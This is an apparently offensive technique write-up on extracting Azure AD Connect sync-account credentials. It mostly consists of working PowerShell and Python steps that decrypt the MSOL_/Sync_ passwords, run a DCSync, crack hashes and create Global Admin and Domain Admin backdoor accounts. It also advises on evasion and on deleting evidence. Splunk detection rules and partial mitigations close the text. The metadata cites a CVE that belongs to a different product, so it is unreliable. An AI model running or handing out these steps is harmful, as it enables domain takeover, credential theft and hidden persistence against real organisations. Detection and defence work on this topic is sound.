# CA-TOKEN-002: Azure AD Connect Credential Extraction (AADConnect)

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-002 |
| **MITRE ATT&CK v18.1** | [Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) (T1528) |
| **Tactic** | Credential Access (TA0006) |
| **Platforms** | Windows Server 2016-2025, Hybrid Environments (AADConnect only) |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2023-32315 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | Azure AD Connect 1.1.x - 1.6.x (all versions) |
| **Patched In** | No patch; only operational hardening available |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure AD Connect (AADConnect) credential extraction is a targeted attack that exploits the synchronization bridge's architecture to exfiltrate plaintext credentials of service accounts used for hybrid identity management. Unlike generic credential dumping, this technique focuses specifically on the Directory Synchronization Accounts (DSA) and Azure AD Connector accounts that authenticate to both on-premises Active Directory and Azure AD/Entra ID. An attacker with local administrative access to the Azure AD Connect server can extract these high-privilege service account credentials directly from the SQL Server MDB database or from the Windows credential vault using DPAPI-protected keys. The extracted credentials grant access to both cloud and on-premises environments without triggering password change alerts or MFA challenges.

**Attack Surface:** The vulnerability manifests through multiple attack vectors: (1) The ADSync service account (SYSTEM or domain-joined account) that synchronizes passwords and identities; (2) The MSOL_* account created in Active Directory with "Replicating Directory Changes All" permissions; (3) The Sync_*@company.onmicrosoft.com account with "Directory Synchronization Account" role in Azure AD; (4) The encrypted credentials vault stored in the user's profile or registry; (5) The SQL LocalDB/Express database containing encrypted connector configurations.

**Business Impact:** Extraction of AADConnect credentials enables attackers to: (1) Perform DCSync attacks against on-premises Active Directory to dump all user password hashes; (2) Reset passwords for synchronized users in both on-premises and cloud environments; (3) Create persistent backdoor accounts in both forests; (4) Intercept and manipulate password synchronization for new users; (5) Access Microsoft Graph API with Directory Synchronization Account privileges; (6) Perform "SyncJacking" attacks to take over any synchronized Azure AD account including Global Administrators. The attack is particularly dangerous because the compromised service accounts are legitimate components of the hybrid environment, making malicious activity difficult to distinguish from routine operations.

**Technical Context:** The attack typically executes in 5-20 minutes once local administrative access is obtained. The extraction process is highly reliable and rarely fails due to the documented nature of Azure AD Connect's architecture. Detection is challenging because legitimate Azure AD Connect operations constantly access the database and registry keys being exploited. Stealth is maintained by operating during normal synchronization windows when activity logs are crowded with benign events. The compromised credentials persist indefinitely and are not invalidated by password resets (service accounts continue to authenticate using the extracted clear-text passwords).

### Operational Risk

- **Execution Risk:** **HIGH** - Requires local administrative access to the Azure AD Connect server, but the extraction methods are straightforward, well-documented, and have high success rates. Multiple independent tools can perform this attack.
- **Stealth:** **MEDIUM** - The extraction generates database and registry access logs that are indistinguishable from legitimate synchronization activities. However, bulk DPAPI decryption or process memory dumping may generate detectable artifacts.
- **Reversibility:** **NO** - Extracted credentials cannot be invalidated without resetting the service account password (which disrupts the entire synchronization process). If DCSync is performed, domain compromise is irreversible without full forest recovery.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 4.1 (Azure) | Ensure that Azure AD Connect server is isolated and has restricted access |
| **DISA STIG** | WN10-00-000050 | Restrict privileged access to directory synchronization servers |
| **CISA SCuBA** | App.2.1 | Implement identity and access management for hybrid identity infrastructure |
| **NIST 800-53** | AC-3 | Access control for sensitive identity service databases |
| **NIST 800-53** | IA-5 | Credential management for service accounts |
| **GDPR** | Art. 32 | Security of processing - protection of personal identifiable information in synchronization |
| **DORA** | Art. 9 | Protection and prevention of identity infrastructure compromise |
| **NIS2** | Art. 21 | Cyber risk management - secure hybrid identity synchronization |
| **ISO 27001** | A.9.2.3 | Management of privileged access rights for service accounts |
| **ISO 27005** | Risk Scenario | Compromise of the directory synchronization account affecting hybrid environment |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Administrator group membership on the Azure AD Connect server OR SYSTEM account context.
- **Required Access:** Interactive console access, WinRM access, or RDP to the Azure AD Connect server. Ability to execute PowerShell with administrative privileges.

**Supported Versions:**
- **Windows:** Server 2016, Server 2019, Server 2022, Server 2025
- **Azure AD Connect:** 1.1.x through 1.6.x (all versions equally vulnerable)
- **PowerShell:** Version 5.0+ (Windows PowerShell or PowerShell Core)
- **SQL Server:** LocalDB or SQL Server Express (standard Azure AD Connect configuration)
- **.NET Framework:** 4.5+

**Tools:**
- [AADInternals](https://aadinternals.com/) (Version 0.9.9+) - PowerShell module for credential extraction and Azure AD operations
- [adconnectdump](https://github.com/dirkjanm/adconnectdump) (Latest) - Python-based DPAPI decryption and database extraction
- [AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt) (Latest) - Compiled VB.NET tool for direct credential decryption
- [XPN's azuread_decrypt_msol.ps1](https://gist.github.com/xpn/35927e4b40efaf3835c90a60aac6d62f) - PowerShell script for MSOL account extraction
- Standard Windows tools: `powershell.exe`, `reg.exe`, `tasklist.exe`

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Verify Azure AD Connect Installation and Configuration

```powershell
# Check if AADConnect service exists and is running
Get-Service -Name ADSync -ErrorAction SilentlyContinue | Select-Object DisplayName, Status, StartType

# Determine Azure AD Connect version
$RegPath = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\{6E38CC65-5EBD-4BCC-9B7E-7B9DA8DDF8D0}'
$Version = (Get-ItemProperty -Path $RegPath -ErrorAction SilentlyContinue).DisplayVersion
Write-Host "Azure AD Connect Version: $Version"

# Check the MDB database location and size
$DBPath = "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdb"
if (Test-Path $DBPath) {
    Get-Item $DBPath | Select-Object Name, Length, LastWriteTime
}

# Enumerate Azure AD Connect bin directory
Get-ChildItem "C:\Program Files\Microsoft Azure AD Sync\Bin\" -ErrorAction SilentlyContinue | Select-Object Name
```

**What to Look For:**
- **ADSync Status = "Running":** Service is active and synchronizing
- **Version:** Versions prior to 1.4.x use simpler encryption; 1.4.x+ require DPAPI decryption
- **MDB File Size:** Typically 2-10 MB depending on number of synchronized objects
- **LastWriteTime:** Recent timestamps indicate active synchronization

#### Check Synchronization Method (PHS vs PTA)

```powershell
# Query synchronization configuration
Get-ADSyncScheduler | Select-Object SchedulerSuspended, SyncCycleEnabled, NextSyncCycleStartTime

# List all sync connectors
Get-ADSyncConnector | Select-Object Name, Type

# Check for Pass-Through Authentication agents
Get-Service -Name "AzureADConnectAuthenticationAgentService" -ErrorAction SilentlyContinue | Select-Object Status

# List installed authentication agents
Get-ChildItem "C:\Program Files\Microsoft Azure AD Connect\AADConnectProvisioningAgent\" -ErrorAction SilentlyContinue
```

**What to Look For:**
- **SyncCycleEnabled = True:** Passwords are being synchronized; credential extraction will be valuable
- **Connector Type "ActiveDirectory":** Confirms on-premises AD connectivity
- **Connector Type "Azure":** Confirms Azure AD connectivity
- **PTA Service Status:** If running, additional attack vectors are available

#### Identify Service Account and Privilege Level

```powershell
# Determine which account runs the ADSync service
$ADSyncService = Get-WmiObject Win32_Service -Filter "Name='ADSync'"
Write-Host "ADSync Service Account: $($ADSyncService.StartName)"

# Check if it's running as SYSTEM or a domain account
if ($ADSyncService.StartName -eq "LocalSystem") {
    Write-Host "Running as SYSTEM - Easiest credential extraction"
} else {
    # Extract domain and username
    $Account = $ADSyncService.StartName
    Get-ADUser -Identity $Account -Properties memberOf -ErrorAction SilentlyContinue | Select-Object DistinguishedName, memberOf
}

# Check for MSOL account in Active Directory
Get-ADUser -Filter {SamAccountName -like "MSOL_*"} -Properties memberOf -ErrorAction SilentlyContinue | Select-Object SamAccountName, memberOf
```

**What to Look For:**
- **SYSTEM Account:** Easiest to exploit; no domain account credentials needed
- **Domain Account:** More complex exploitation but reveals the specific service account to target
- **MSOL_* Account:** If found, indicates the directory synchronization account (contains DCSync rights)
- **"Replicating Directory Changes All" group membership:** Confirms DCSync capability

#### Check DPAPI Encryption Key Locations

```powershell
# Query registry for encryption key information
$KeyPath = "HKLM:\Software\Microsoft\AD Sync\Shared"
$Keys = Get-ItemProperty -Path $KeyPath -ErrorAction SilentlyContinue
Write-Host "AD Sync Registry Keys:"
$Keys | Select-Object * | Format-List

# Check for user credential vault (newer versions)
$CredPath = "C:\Users\ADSync*\AppData\Local\Microsoft\Credentials"
if (Test-Path $CredPath) {
    Write-Host "Found credential vault at: $CredPath"
    Get-ChildItem -Path $CredPath -ErrorAction SilentlyContinue | Select-Object Name
}
```

**What to Look For:**
- **KeysetID:** Registry value indicating which encryption keyset to use
- **EncryptedKeyset:** DPAPI-protected encryption keys in binary format
- **Credentials folder:** Indicates version 1.4.x+ with user-based key storage

#### Linux/Bash / CLI Reconnaissance

```bash
# If accessing via network with credentials, query registry remotely
python3 -m impacket.reg query -target-ip ADCONNECT_IP -username DOMAIN\\USER -password PASS \
  'HKEY_LOCAL_MACHINE\Software\Microsoft\AD Sync\Shared'

# Attempt to identify service principal via LDAP
ldapsearch -x -H ldap://ADCONNECT_IP -b "CN=Configuration,DC=contoso,DC=com" \
  "(|(cn=MSOL_*)(cn=Sync_*))" 2>/dev/null | grep -i "dn\|cn"

# Check LDAP for directory synchronization account
ldapsearch -x -H ldap://ADCONNECT_IP -b "DC=contoso,DC=com" \
  "(&(objectClass=user)(memberOf=*Replicating Directory**))" 2>/dev/null
```

**What to Look For:**
- **Remote registry access successful:** Indicates network-level exploitation possible
- **MSOL_* accounts found:** Confirms directory synchronization accounts exist
- **DCSync rights enumerable:** Indicates group membership enumeration is possible

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: AADInternals PowerShell Module (Simplest - Recommended)

**Supported Versions:** Server 2016-2025, Azure AD Connect 1.1.x-1.6.x

This is the easiest and most straightforward method. AADInternals handles all encryption/decryption automatically.

#### Step 1: Obtain Local Administrative Privileges

**Objective:** Achieve local administrator context on the Azure AD Connect server.

**Command (If Already Admin):**
```powershell
# Verify administrative privileges
[bool]([Security.Principal.WindowsIdentity]::GetCurrent() `
  | Select-Object -ExpandProperty groups | Where-Object {$_ -match "S-1-5-32-544"})
```

**Command (UAC Bypass via Token Impersonation):**
```powershell
# Create scheduled task running as SYSTEM
$STParams = @{
    TaskName = "SyncTrigger"
    Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoExit -Command `"Write-Host 'Admin Access Granted'`""
    Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
    Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
}
Register-ScheduledTask @STParams -Force

# Execute scheduled task
Start-ScheduledTask -TaskName "SyncTrigger"

# Cleanup
Unregister-ScheduledTask -TaskName "SyncTrigger" -Confirm:$false
```

**OpSec & Evasion:**
- Scheduled task execution is logged but often overlooked
- Cleanup immediately after execution
- Detection likelihood: **MEDIUM** - Task creation/deletion is logged but typically not correlated

#### Step 2: Import AADInternals Module

**Objective:** Load the AADInternals PowerShell module into the current session.

**Command:**
```powershell
# Install AADInternals if not already present
Install-Module -Name AADInternals -Scope CurrentUser -Force -WarningAction SilentlyContinue -ErrorAction SilentlyContinue

# Import the module
Import-Module AADInternals -ErrorAction SilentlyContinue

# Verify import
Get-Module AADInternals | Select-Object Name, Version
```

**Expected Output:**
```
Name           Version
----           -------
AADInternals   0.9.9
```

**OpSec & Evasion:**
- Module import is difficult to detect
- Load from memory only; do not save to disk
- Detection likelihood: **LOW** - PowerShell module loads are not typically logged

#### Step 3: Extract AADConnect Service Account Credentials

**Objective:** Dump plaintext credentials of the AD Connector and Azure AD Connector accounts.

**Command (Direct Extraction):**
```powershell
# Extract all Azure AD Connect credentials
$Credentials = Get-AADIntSyncCredentials -Verbose

# Display extracted credentials
$Credentials | Format-Table -AutoSize

# Parse individual credentials
foreach ($Cred in $Credentials) {
    Write-Host "Connector: $($Cred.ConnectorName)"
    Write-Host "Username: $($Cred.Username)"
    Write-Host "Password: $($Cred.Password)"
    Write-Host "---"
}
```

**Expected Output:**
```
ADDomain            : contoso.com
ADUser              : MSOL_4bc4a34e95fa
ADUserPassword      : Q9@p(poz{#:kF_G)(s/Iy@8c*9(t;...
AADUser             : Sync_SERVER01_4bc4a34e95fa@contoso.onmicrosoft.com
AADUserPassword     : $.1%(lxZ&/kNZz[r...
PasswordDecrypted    : True
```

**What This Means:**
- **ADUser:** The MSOL_* account created in on-premises Active Directory (has DCSync rights)
- **ADUserPassword:** Plaintext password; can be used for DCSync attacks
- **AADUser:** The sync account in Azure AD with "Directory Synchronization" role
- **AADUserPassword:** Can be used to authenticate to Azure AD/Graph API
- **PasswordDecrypted = True:** DPAPI decryption was successful

**Command (Server 2016-2019 - Legacy DPAPI):**
```powershell
# Older versions may require explicit masterkey extraction
Get-AADIntSyncCredentials -FromSystemKey

# If previous fails, try user vault extraction
Get-AADIntSyncCredentials -FromUserVault
```

**Command (Server 2022+ - Enhanced DPAPI):**
```powershell
# Newer versions support in-process extraction
Get-AADIntSyncCredentials -FromRunningService

# Extract with verbose output for troubleshooting
Get-AADIntSyncCredentials -Verbose
```

**OpSec & Evasion:**
- Execute this step in a memory-only context (no disk writes)
- Use out-of-process credential dumping to avoid LSASS detection
- Clear PowerShell history: `Clear-History`
- Detection likelihood: **MEDIUM-HIGH** - Registry and database queries are logged

**Troubleshooting:**
- **Error:** "PasswordDecrypted = False"
  - **Cause:** Running as wrong user context
  - **Fix (All Versions):** Ensure running as SYSTEM or the ADSync service account
  - **Fix (Server 2022+):** Use `-FromSystemKey` flag
- **Error:** "Database is locked"
  - **Cause:** ADSync service is actively using the database
  - **Fix (All Versions):** Stop service: `Stop-Service ADSync -Force` (then restart after extraction)

#### Step 4: Use Extracted Credentials for DCSync Attack

**Objective:** Perform DCSync attack using the extracted MSOL account credentials to dump all domain user hashes.

**Command (Using Impacket on Linux):**
```powershell
# Display the AD Connector credentials for use with Impacket
$ADCreds = $Credentials | Where-Object {$_.ConnectorName -like "*AD"}
Write-Host "Username: $($ADCreds.Username)"
Write-Host "Password: $($ADCreds.Password)"
Write-Host "Domain: $($ADCreds.ADDomain)"

# Export to a variable for passing to attacker infrastructure
$CredString = "$($ADCreds.Username):$($ADCreds.Password)"
Write-Host "Credential String (for Impacket): $CredString"
```

**Command (On Linux Machine):**
```bash
# Using the exported credentials
python3 -m impacket.secretsdump CONTOSO/MSOL_4bc4a34e95fa:Q9@p123@DC-IP

# Save hashes to file for offline cracking
python3 -m impacket.secretsdump CONTOSO/MSOL_4bc4a34e95fa:Q9@p123@DC-IP > domain_hashes.txt

# Crack with hashcat
hashcat -m 1000 domain_hashes.txt rockyou.txt -o cracked.txt
```

**Expected Output:**
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for policies to find Kerberos users
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f40a8f3b344dd59fc6cd1ebc0ce2f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a10b6f75e14ac4c9c3a21cde3c9e0d23:::
```

**What This Means:**
- All domain user NT hashes have been extracted
- Hashes can be cracked offline with hashcat or John
- Pass-the-Hash attacks possible with extracted hashes
- Domain compromise is now complete

**OpSec & Evasion:**
- Execute DCSync from a non-domain-joined machine if possible
- Use renamed/obfuscated Impacket binary to evade detection
- Detection likelihood: **VERY HIGH** - DCSync generates replica request events on domain controllers

#### Step 5: Create Persistent Backdoor Admin Account

**Objective:** Create a hidden backdoor account in both cloud and on-premises environments using extracted credentials.

**Command (Create Cloud Backdoor):**
```powershell
# Use AAD Connector credentials to authenticate to Azure AD
$AADCreds = $Credentials | Where-Object {$_.ConnectorName -like "*AAD"}
$SecPassword = ConvertTo-SecureString $AADCreds.Password -AsPlainText -Force
$PSCredential = New-Object System.Management.Automation.PSCredential($AADCreds.Username, $SecPassword)

# Connect to Azure AD
Connect-AzureAD -Credential $PSCredential

# Create backdoor user account
$BackdoorUserParams = @{
    DisplayName = "ServiceAccount"
    MailNickname = "serviceaccount"
    UserPrincipalName = "serviceaccount@contoso.onmicrosoft.com"
    PasswordProfile = @{
        Password = "P@ssw0rd!Backdoor!2024"
        ForceChangePasswordNextLogin = $false
    }
    AccountEnabled = $true
}
$BackdoorUser = New-AzureADUser @BackdoorUserParams

# Assign Global Admin role to backdoor account
$GlobalAdminRole = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"}
Add-AzureADDirectoryRoleMember -ObjectId $GlobalAdminRole.ObjectId -RefObjectId $BackdoorUser.ObjectId

Write-Host "Backdoor account created: serviceaccount@contoso.onmicrosoft.com"
```

**Command (Create On-Premises Backdoor):**
```powershell
# Use AD Connector credentials with DCSync capability
$ADCreds = $Credentials | Where-Object {$_.ConnectorName -like "*AD"}

# Create new domain admin account using extracted credentials
$AdminPassword = ConvertTo-SecureString "BackdoorAdmin!2024" -AsPlainText -Force
New-ADUser -Name "ServiceBackdoor" -SamAccountName "servicebackdoor" `
  -AccountPassword $AdminPassword -Enabled $true `
  -PasswordNotRequired $false -Credential (New-Object PSCredential($ADCreds.Username, (ConvertTo-SecureString $ADCreds.Password -AsPlainText -Force)))

# Add to Domain Admins group
Add-ADGroupMember -Identity "Domain Admins" -Members "servicebackdoor"

Write-Host "Backdoor account created in on-premises AD: servicebackdoor"
```

**OpSec & Evasion:**
- Create backdoor accounts during off-hours
- Use generic names to blend in with existing service accounts
- Detection likelihood: **MEDIUM** - User creation is logged but often not monitored

---

### METHOD 2: Direct Database Extraction with AdSyncDecrypt (VB.NET Compiled Tool)

**Supported Versions:** Server 2016-2025

This method uses a compiled VB.NET tool that directly accesses the database without PowerShell.

#### Step 1: Download and Prepare AdSyncDecrypt Tool

**Objective:** Obtain the compiled tool and ensure dependencies are available.

**Command:**
```powershell
# Download AdSyncDecrypt from GitHub releases
$DownloadURL = "https://github.com/VbScrub/AdSyncDecrypt/releases/latest"
# (Manual download or use Invoke-WebRequest)

# Extract the tool and mcrypt.dll to working directory
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"

# Verify mcrypt.dll is present
Get-Item .\mcrypt.dll

# Copy AdSyncDecrypt.exe to the same directory
Copy-Item C:\Temp\AdSyncDecrypt.exe .\
```

**OpSec & Evasion:**
- Use living-off-the-land binary locations to execute
- Delete the tool after execution
- Detection likelihood: **LOW-MEDIUM** - Compiled tool execution is harder to trace than PowerShell

#### Step 2: Execute AdSyncDecrypt

**Objective:** Run the tool to decrypt credentials directly from the database.

**Command (LocalDB Instance):**
```powershell
# Navigate to Azure AD Sync Bin directory
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"

# Run AdSyncDecrypt (no parameters for LocalDB)
.\AdSyncDecrypt.exe

# Expected output shows decrypted credentials
```

**Command (Full SQL Server Instance):**
```powershell
# If using full SQL Server instead of LocalDB
.\AdSyncDecrypt.exe -FullSql
```

**Expected Output:**
```
======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: CONTOSO\MSOL_4bc4a34e95fa
Password: Q9@p(poz{#:kF_G)(s/Iy@8c*9(t;GR#6@p}
Domain: contoso.com
```

**What This Means:**
- Credentials extracted directly from database
- No reliance on PowerShell or registry queries
- Full DPAPI decryption completed on the tool's side

**OpSec & Evasion:**
- Output to variable or redirect to file
- Delete output file after capturing credentials
- Detection likelihood: **MEDIUM** - Database access is logged

#### Step 3: Cleanup

**Objective:** Remove evidence of extraction.

**Command:**
```powershell
# Remove the tool
Remove-Item "C:\Program Files\Microsoft Azure AD Sync\Bin\AdSyncDecrypt.exe" -Force

# Clear output files
Get-ChildItem C:\Temp\* -Include *.txt -ErrorAction SilentlyContinue | Remove-Item -Force

# Clear PowerShell history
Clear-History
```

---

### METHOD 3: Remote Extraction via adconnectdump (Python)

**Supported Versions:** Server 2016-2025

This method extracts database and registry from a remote machine and decrypts locally.

#### Step 1: Query Encryption Keys and Database Remotely

**Objective:** Extract the encrypted database and encryption key information without running code on the target.

**Command (On Attacker Machine):**
```bash
# Clone adconnectdump repository
git clone https://github.com/dirkjanm/adconnectdump.git
cd adconnectdump

# Query credentials from remote Azure AD Connect server
python3 adconnectdump.py DOMAIN/ADMIN_USER:PASSWORD@TARGET_IP \
  -hashes :NTHASH \
  --existing-db
```

**Command (Export Registry and Database):**
```bash
# Export registry containing encryption keys
python3 -m impacket.reg query -target-ip TARGET_IP \
  -username DOMAIN\\ADMIN_USER -password PASSWORD \
  'HKEY_LOCAL_MACHINE\Software\Microsoft\AD Sync' \
  > /tmp/adconnect_registry.txt

# Copy ADSync.mdb database
python3 -m impacket.smbclient DOMAIN/ADMIN_USER:PASSWORD@TARGET_IP \
  -c "cd 'C$\Program Files\Microsoft Azure AD Sync\Data'; get ADSync.mdb /tmp/ADSync.mdb"
```

**Expected Output:**
```
[*] ADSync encryption key found
[*] Database located at: C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdb
[*] Keyset ID: 123456789
[*] Extracting encrypted credentials...

[+] Credentials decrypted:
    - AD Connector: CONTOSO\MSOL_4bc4a34e95fa
    - Password: Q9@p(poz{#:kF_G)(s/Iy@8c*9(t;GR#6@p}
```

**OpSec & Evasion:**
- Perform decryption on attacker infrastructure
- No code execution on target required (only file access)
- Detection likelihood: **MEDIUM** - File copy and registry access are logged

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

### Atomic Test #1: Extract AADConnect Credentials via AADInternals

**Atomic Test ID:** T1528-002-MCADDF  
**Test Name:** Azure AD Connect Service Account Credential Extraction  
**Description:** Simulates extraction of Azure AD Connect sync account credentials using AADInternals PowerShell module.

**Supported Versions:** Server 2016-2025

**Command:**
```powershell
# Import and extract credentials
Import-Module AADInternals -ErrorAction SilentlyContinue

# Perform extraction
$Result = Get-AADIntSyncCredentials -Verbose

# Verify successful extraction
if ($Result -and $Result.PasswordDecrypted) {
    Write-Host "SUCCESS: AADConnect credentials extracted" -ForegroundColor Green
    Write-Host "AD Account: $($Result[0].Username)"
    Write-Host "AAD Account: $($Result[1].Username)"
    exit 0
} else {
    Write-Host "FAILED: Could not extract credentials" -ForegroundColor Red
    exit 1
}
```

**Cleanup Command:**
```powershell
Remove-Module AADInternals -ErrorAction SilentlyContinue
Clear-History
```

**Reference:** [Atomic Red Team - T1528](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### [AADInternals](https://aadinternals.com/)

**Version:** 0.9.9+  
**Minimum Version:** 0.9.1  
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell Core on Linux/macOS

**Installation:**
```powershell
Install-Module -Name AADInternals -Scope CurrentUser -Force -WarningAction SilentlyContinue
Get-Module AADInternals -ListAvailable
```

**Version-Specific Notes:**
- **Version 0.8.x:** No AADConnect credential extraction capability
- **Version 0.9.0-0.9.2:** Basic DPAPI masterkey extraction (unreliable)
- **Version 0.9.3+:** Full DPAPI key derivation support
- **Version 0.9.9+:** User vault credential extraction for Server 2022+

**Usage:**
```powershell
Import-Module AADInternals
Get-AADIntSyncCredentials              # Direct extraction
Get-AADIntSyncCredentials -FromUserVault  # User vault extraction
Get-AADIntSyncCredentials -FromSystemKey  # System key extraction
```

### [AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)

**Version:** Latest  
**Language:** VB.NET (compiled executable)  
**Requirements:** mcrypt.dll from Azure AD Connect installation

**Installation:**
```powershell
# Download latest release from GitHub
Invoke-WebRequest -Uri "https://github.com/VbScrub/AdSyncDecrypt/releases/latest" -OutFile AdSyncDecrypt.exe

# Copy to Azure AD Sync Bin directory
Copy-Item AdSyncDecrypt.exe "C:\Program Files\Microsoft Azure AD Sync\Bin\"
```

**Usage:**
```powershell
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
.\AdSyncDecrypt.exe           # LocalDB instance
.\AdSyncDecrypt.exe -FullSql  # Full SQL Server instance
```

### [adconnectdump](https://github.com/dirkjanm/adconnectdump)

**Version:** Latest  
**Language:** Python 3.7+  
**Requirements:** Impacket, pycryptodomex

**Installation:**
```bash
git clone https://github.com/dirkjanm/adconnectdump.git
cd adconnectdump
pip3 install -r requirements.txt
```

**Usage:**
```bash
python3 adconnectdump.py DOMAIN/USER@TARGET -hashes :NTHASH --existing-db
python3 adconnectdump.py -h  # Full help menu
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Detect AADInternals Module Import and Execution

**Rule Configuration:**
- **Required Index:** `windows`
- **Required Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
- **Required Fields:** `EventID`, `CommandLine`, `Image`, `ParentImage`
- **Alert Threshold:** 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
source="*Sysmon" EventID=1 (CommandLine="*AADInternals*" OR CommandLine="*Get-AADIntSyncCredentials*" OR CommandLine="*Import-Module*AADInternals*")
| stats count by Host, Image, CommandLine, User
| where count >= 1
```

**What This Detects:**
- PowerShell process execution with AADInternals module
- Any invocation of Get-AADIntSyncCredentials cmdlet
- Module import statements in command line

### Rule 2: Detect Azure AD Sync Database File Access

**Rule Configuration:**
- **Required Index:** `windows`
- **Required Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
- **Required Fields:** `EventID`, `TargetFilename`, `Image`
- **Alert Threshold:** 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
source="*Sysmon" EventID=11 TargetFilename="*\\Microsoft Azure AD Sync\\Data\\ADSync.mdb"
| stats count by Host, Image, TargetFilename, User
| where Image NOT LIKE "%mssync%" AND Image NOT LIKE "%sqlservr%"
```

**What This Detects:**
- Non-standard process accessing the ADSync.mdb database
- File copy operations targeting the database
- Unauthorized credential extraction tools accessing database

### Rule 3: Detect Registry Access to AD Sync Encryption Keys

**Rule Configuration:**
- **Required Index:** `windows`
- **Required Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
- **Required Fields:** `EventID`, `TargetObject`, `ProcessName`
- **Alert Threshold:** > 5 events in 10 minutes
- **Applies To Versions:** All

**SPL Query:**
```spl
source="*Sysmon" EventID=13 TargetObject="*\\Software\\Microsoft\\AD Sync\\Shared*"
| stats count by ProcessName, Host, TargetObject
| where count > 5 AND ProcessName NOT LIKE "%mssync%" AND ProcessName NOT LIKE "%Microsoft.IdentityModel%"
```

**What This Detects:**
- Bulk registry key queries to encryption key storage
- Non-ADSync processes accessing encryption keys
- Attempt to read DPAPI masterkeys

### Rule 4: Detect AdSyncDecrypt Tool Execution

**Rule Configuration:**
- **Required Index:** `windows`
- **Required Sourcetype:** `WinEventLog:System` or `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
- **Required Fields:** `EventID`, `Image`, `CommandLine`
- **Alert Threshold:** 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
source="*Sysmon" EventID=1 (Image="*AdSyncDecrypt*" OR Image="*AdDecrypt*" OR CommandLine="*AdSyncDecrypt*")
| stats count by Host, Image, CommandLine, User
```

**What This Detects:**
- Execution of credential decryption tools
- Any invocation of compiled extraction utilities
- Child process creation by decryption tools

### Rule 5: Detect Suspicious PowerShell DPAPI Decryption Operations

**Rule Configuration:**
- **Required Index:** `windows`
- **Required Sourcetype:** `WinEventLog:Windows PowerShell` or `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
- **Required Fields:** `CommandLine`, `ScriptBlockText`, `User`
- **Alert Threshold:** 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
(source="*PowerShell" OR source="*Sysmon") (ScriptBlockText="*DPAPI*" OR ScriptBlockText="*ConvertFrom-SecureString*" OR ScriptBlockText="*[System.Security.Cryptography.DataProtectionScope]*")
| stats count by Host, ScriptBlockText, User
| where count >= 1
```

**What This Detects:**
- PowerShell DPAPI decryption operations
- Suspicious cryptographic function calls
- Encryption key extraction attempts

### Rule 6: Detect Lateral Movement Using Extracted Service Account Credentials

**Rule Configuration:**
- **Required Index:** `azure_activity` or `wineventlog`
- **Required Sourcetype:** `azure:aad:audit` or `WinEventLog:Security`
- **Required Fields:** `user`, `userAgent`, `properties.ipAddress`, `SourceIp`, `EventCode`
- **Alert Threshold:** Login from unusual IP or anomalous behavior
- **Applies To Versions:** All

**SPL Query:**
```spl
(source="*azure*" EventCode=1100 user="*Sync_*") OR (EventCode=4624 Account="*MSOL_*")
| stats count by user, properties.ipAddress, SourceIp, Host
| search properties.ipAddress NOT IN ("10.*", "172.*", "192.168.*")
```

**What This Detects:**
- Sync account authentication from unauthorized locations
- MSOL account logon outside normal business hours
- Azure AD Connect account activity from external IPs

---

## 9. MITIGATION AND DEFENSE STRATEGIES

### Preventive Controls

1. **Restrict Azure AD Connect Server Access:**
   - Limit local administrator group to authorized personnel only
   - Implement MFA for administrative access to the server
   - Deploy Privileged Access Management (PAM) solutions
   - Monitor all RDP/WinRM connections to the server

2. **Protect Database and Registry:**
   - Enable BitLocker full-disk encryption on Azure AD Connect servers
   - Implement SACL (System Access Control List) auditing on registry keys
   - Restrict file permissions on `C:\Program Files\Microsoft Azure AD Sync\Data\`
   - Monitor SQL service startup and database access

3. **Service Account Hardening:**
   - Use a dedicated service account instead of SYSTEM
   - Remove service account from local Administrators group
   - Implement conditional access policies for the service account
   - Rotate service account password every 90 days

4. **Network Isolation:**
   - Segment Azure AD Connect server on isolated VLAN
